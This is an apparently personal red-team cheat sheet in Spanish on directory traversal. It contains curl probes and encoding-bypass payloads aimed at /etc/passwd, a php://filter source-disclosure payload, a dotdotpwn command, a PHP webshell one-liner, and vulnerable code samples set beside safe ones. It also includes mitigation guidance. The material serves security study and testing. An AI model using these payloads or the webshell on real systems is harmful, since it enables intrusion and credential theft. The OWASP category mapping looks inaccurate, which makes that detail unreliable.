---
aliases:
  - "Directory Traversal Vulnerability"
  - Path Traversal
  - Directory Traversal
  - Dot Dot Slash
  - ../ Attack
tags:
  - vuln/path-traversal
  - vuln/lfi
  - technique/initial-access
  - technique/credential-access
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: CheatSheet
linked:
  - "[[Directory Traversal - Payloads Basicos]]"
  - "[[Directory Traversal - Bypass de Sanitizacion]]"
  - "[[Directory Traversal - Vectores OS y Stack]]"
  - "[[Directory Traversal - Chains y Variantes]]"
  - "[[Directory Traversal - Tooling]]"
  - "[[File Inclusion]]"
  - "[[Insecure Deserialization]]"
  - "[[Burp Suite]]"
---
# Directory Traversal

***

## Cheatsheet

### 🎯 Payloads Básicos

````tabs
tab: **Unix `../` Traversal**
![[Directory Traversal - Payloads Basicos#^pt-payload-unix]]

tab: **Windows `..\\` Traversal**
![[Directory Traversal - Payloads Basicos#^pt-payload-windows]]

tab: **Mixed Encoding**
![[Directory Traversal - Payloads Basicos#^pt-payload-mixed]]

tab: **Absolute Paths**
![[Directory Traversal - Payloads Basicos#^pt-payload-absolute]]
````

### 🔓 Bypass de Sanitización

````tabs
tab: **URL Encoding Variants**
![[Directory Traversal - Bypass de Sanitizacion#^pt-bypass-encoding]]

tab: **Null Byte Truncation**
![[Directory Traversal - Bypass de Sanitizacion#^pt-bypass-nullbyte]]

tab: **Path Normalization**
![[Directory Traversal - Bypass de Sanitizacion#^pt-bypass-normalization]]

tab: **Filter Strip Evasion**
![[Directory Traversal - Bypass de Sanitizacion#^pt-bypass-strip]]
````

### 💉 Vectores por OS / Stack

````tabs
tab: **Linux Objetivos**
![[Directory Traversal - Vectores OS y Stack#^pt-stack-linux]]

tab: **Windows Objetivos**
![[Directory Traversal - Vectores OS y Stack#^pt-stack-windows]]

tab: **PHP Wrappers**
![[Directory Traversal - Vectores OS y Stack#^pt-stack-php-wrappers]]

tab: **Java Path Handling**
![[Directory Traversal - Vectores OS y Stack#^pt-stack-java]]

tab: **Node.js / Express**
![[Directory Traversal - Vectores OS y Stack#^pt-stack-node]]
````

### 🔗 Chains y Variantes

````tabs
tab: **LFI to RCE Chain**
![[Directory Traversal - Chains y Variantes#^pt-chain-lfi-rce]]

tab: **Path Traversal en Upload**
![[Directory Traversal - Chains y Variantes#^pt-chain-upload]]

tab: **ZIP Slip / Tar Slip**
![[Directory Traversal - Chains y Variantes#^pt-chain-zipslip]]

tab: **Symlink Abuse**
![[Directory Traversal - Chains y Variantes#^pt-chain-symlink]]

tab: **ImageMagick / File Processors**
![[Directory Traversal - Chains y Variantes#^pt-chain-image]]
````

### 🛠️ Tooling

````tabs
tab: **dotdotpwn**
![[Directory Traversal - Tooling#^pt-tool-dotdotpwn]]

tab: **LFISuite**
![[Directory Traversal - Tooling#^pt-tool-lfisuite]]

tab: **Burp Intruder + Wordlists**
![[Directory Traversal - Tooling#^pt-tool-burp]]

tab: **Wordlists Recomendadas**
![[Directory Traversal - Tooling#^pt-tool-wordlists]]

tab: **Custom Scripts**
![[Directory Traversal - Tooling#^pt-tool-custom]]
````

___

## Overview

**Directory Traversal** (también **Path Traversal**, **`../` Attack**) = atacante manipula path proveído al backend para acceder archivos fuera del directorio intencionado. Backend concatena user input con path base (`/var/www/uploads/${filename}`) sin sanitización → atacante usa `../` para subir directorios y leer archivos sensibles del filesystem.

OWASP Top 10 — A05 (2021) Security Misconfiguration / A04 (2017) XML External Entities. Vector frecuente con high impact: file disclosure (`/etc/passwd`, `/etc/shadow`, app configs), credentials theft, chain a LFI → RCE.

### Diferencia con LFI / RFI

| | **Path Traversal** | **LFI** | **RFI** |
|---|---|---|---|
| Scope | Lectura archivos fuera de scope | Inclusión de archivos local | Inclusión de archivos remoto |
| Mecanismo | Concatenación path | `include()`, `require()` PHP | `include()` con URL remota |
| Impacto | File disclosure | File disclosure + RCE (si exec) | RCE direct |
| Lenguaje agnóstico | ✓ (todos) | PHP-specific (mostly) | PHP-specific |
| Resultado | Bytes del file | Code execution si interpretable | Code execution direct |

Path Traversal es vector **agnóstico al lenguaje** — afecta cualquier app que concatene paths. LFI es subset PHP-specific cuando file leído también se ejecuta.

___

## Workflow de explotación

```
1. Identificar endpoint con file param:
   - ?file= ?path= ?include= ?image= ?download=
   - Body POST con file field
   - Path segment /file/X.txt

2. Probe básico:
   - ../etc/passwd → Linux probe
   - ..\\windows\\win.ini → Windows probe
   - /etc/passwd → absolute (no traversal)

3. Si bloqueado, escalar bypasses:
   a. URL encoding (single/double/UTF-8 overlong).
   b. Null byte truncation %00.
   c. Filter strip bypass (....//).
   d. Path normalization differences.
   e. ;..\/ Tomcat-style.

4. Identificar OS:
   - Linux → /etc/passwd, /proc/self/environ
   - Windows → win.ini, web.config
   - Stack via headers (X-Powered-By, Server)

5. Decidir explotación:
   a. Pure file disclosure → leer config / secrets.
   b. PHP wrappers (php://filter, data://, expect://) → RCE.
   c. Log poisoning + LFI → RCE chain.
   d. Upload + traversal → webshell drop.
   e. Archive extraction (ZIP slip) → file write.
   f. Symlink abuse → race conditions.

6. Escalation:
   - Read source code via php://filter/base64.
   - Steal SSH keys / AWS creds / app secrets.
   - Pivot to other vulns (LFI to RCE, webshell).
```

___

## Detección rápida

### Indicadores en código backend

```php
// PHP — VULN
<?php
include($_GET['page'] . '.php');  // ← LFI directo
readfile($_GET['file']);          // ← File disclosure
?>

// PHP — SAFE
$allowed = ['home', 'about', 'contact'];
$page = in_array($_GET['page'], $allowed) ? $_GET['page'] : 'home';
include($page . '.php');
```

```python
# Python — VULN
def serve_file(filename):
    with open('/var/www/uploads/' + filename) as f:  # ← traversal
        return f.read()

# Python — SAFE
import os
def serve_file(filename):
    base = '/var/www/uploads/'
    full = os.path.realpath(os.path.join(base, filename))
    if not full.startswith(base):
        raise ValueError('Path traversal detected')
    with open(full) as f:
        return f.read()
```

```javascript
// Node.js — VULN
app.get('/file', (req, res) => {
    res.sendFile('/var/www/uploads/' + req.query.name);  // ← traversal
});

// Node.js — SAFE
const path = require('path');
app.get('/file', (req, res) => {
    const base = '/var/www/uploads';
    const full = path.resolve(base, req.query.name);
    if (!full.startsWith(base + path.sep)) {
        return res.status(403).send('Forbidden');
    }
    res.sendFile(full);
});
```

### Probes mínimos

```bash
# 1. Linux probe
curl 'https://target/api/file?path=../../../etc/passwd'

# 2. Windows probe
curl 'https://target/api/file?path=../../../windows/win.ini'

# 3. Bypasses
curl 'https://target/api/file?path=..%2f..%2f..%2fetc%2fpasswd'
curl 'https://target/api/file?path=....//....//....//etc/passwd'
curl 'https://target/api/file?path=..%c0%afetc%c0%afpasswd'

# 4. PHP wrapper
curl 'https://target/api/file?path=php://filter/convert.base64-encode/resource=index.php'

# 5. Auto-tooling
dotdotpwn.pl -m http -h target.com -f /etc/passwd -k 'root:'
```

___

## Impacto

- **File disclosure** — `/etc/passwd`, `/etc/shadow`, app configs (`.env`, `web.config`).
- **Credential theft** — DB passwords, API keys, AWS creds, SSH keys.
- **Source code disclosure** — via `php://filter/base64-encode`.
- **LFI to RCE** — log poisoning, session poisoning, Phar deserialization.
- **Information disclosure** — internal paths, software versions, server config.
- **Persistence** — webshell drop via upload + traversal.
- **Privesc local** — symlink TOCTOU abuse.
- **Container escape** — read host files via mounted paths.
- **DoS** — read special files (`/dev/zero`, `/dev/random`).

___

## Mitigación (defender)

- **NO concatenar input directo en path** — usar whitelist de archivos permitidos:
  ```python
  ALLOWED = {'home.html', 'about.html', 'contact.html'}
  if filename in ALLOWED:
      return open('/views/' + filename).read()
  ```
- **Canonicalize + verify** — resolver path completo + verificar que esté dentro del base:
  ```python
  full = os.path.realpath(os.path.join(base, filename))
  if not full.startswith(base + os.sep):
      raise ValueError('Forbidden')
  ```
- **Use IDs en lugar de paths** — `?file=<UUID>` y mapear a path real en backend.
- **Sandbox el process** — chroot, container, AppArmor / SELinux.
- **Filesystem permissions** — separar webserver UID de file owners.
- **Disable PHP wrappers peligrosos**:
  ```ini
  ; php.ini
  allow_url_include = Off
  allow_url_fopen = Off
  ; Disable expect
  disable_functions = exec, system, passthru, ...
  ```
- **Disable PHP `include` con user input** — auditar code.
- **Web server config** — `Options -Indexes -FollowSymLinks` (Apache).
- **WAF rules** — ModSecurity OWASP CRS detecta `../` patterns.
- **Input validation type-strict** — accept solo alphanumeric en filenames.
- **Logging + alerting** — suspicious paths en logs.
- **Updated software** — newer versions patch null byte issues.

___

## Para entender Path Traversal

**Por qué `../` es tan poderoso:**

Filesystem tree es estructura jerárquica. Cada directorio tiene `..` (parent) implícito en Unix/Windows. `../` significa "subir un nivel". Concatenado N veces, atacante alcanza root: `/var/www/uploads/../../../../etc/passwd` → `/etc/passwd`.

OS resuelve path antes de open. Backend ve string `../../...etc/passwd`, OS resuelve y abre `/etc/passwd`. Filtros que solo bloquean `../` son insuficientes — encoding y normalización differentials los bypasean.

**Por qué bypasses son tan complejos:**

Filter en backend implementa subset de path resolution. OS implementa full path resolution. Diferencia entre ambos = vector. Atacante explota:
- Filter remueve `../` literalmente, OS resuelve `....//` como `../`.
- Filter normaliza a lowercase, OS sí pero filesystem es case-sensitive en Linux.
- Filter strips null byte, OS truncates en NUL byte.
- Filter checks at HTTP layer, OS sees decoded path después.

Cada layer (proxy, app server, language runtime, OS) puede normalizar diferente. Bug surge en differentials.

**Diferencia entre Path Traversal y file:// SSRF:**

- Path Traversal: explota concatenación de path local.
- SSRF con `file://`: explota fetch URL backend, donde `file://` es esquema permitido.

Ambos resultan en file read pero vector distinto.

**Por qué LFI to RCE es tan común en PHP:**

PHP `include()` ejecuta el archivo como código PHP. Si atacante puede:
1. Forzar app a hacer `include($user_input . '.php')`.
2. Inyectar PHP code en algún archivo (log, session, upload).
3. Path traverse al archivo poisoned.

Result: `<?php system($_GET['c']); ?>` ejecuta. Stack PHP es notable por este chain.

___

## Recursos

- [PortSwigger - Directory Traversal](https://portswigger.net/web-security/file-path-traversal) — labs.
- [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal) — payloads.
- [HackTricks - File Inclusion / Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion) — referencia.
- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal) — overview.
- [dotdotpwn](https://github.com/wireghoul/dotdotpwn) — Perl fuzzer.
- [LFISuite](https://github.com/D35m0nd142/LFISuite) — auto-exploit.
- [CWE-22 - Path Traversal](https://cwe.mitre.org/data/definitions/22.html) — MITRE.
- [Snyk - ZIP Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability) — paper original.
- [Orange Tsai - URL Parser Inconsistencies](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) — paper.

***
